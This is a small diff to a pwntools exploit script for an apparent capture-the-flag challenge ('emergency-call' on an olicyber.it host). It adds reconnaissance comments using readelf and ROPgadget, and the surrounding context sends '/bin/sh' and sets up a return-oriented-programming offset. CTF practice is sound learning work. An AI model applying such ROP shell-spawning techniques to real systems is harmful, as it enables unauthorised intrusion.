@@ -1,5 +1,9 @@
 from pwn import *
 
+# Preliminary information
+# readelf -S ./emergency-call | grep .bss
+# ROPgadget --binary ./emergency-call | grep "pop"
+
 HOST = "emergency.challs.olicyber.it"
 PORT = 10306
 
@@ -17,7 +21,6 @@ data = p.recvuntil(b">")
 print(data)
 p.sendline(b"/bin/sh\x00")
 
-# ROPgadget --binary ./emergency-call | grep "pop"
 
 # Gadget ROP
 offset = 40
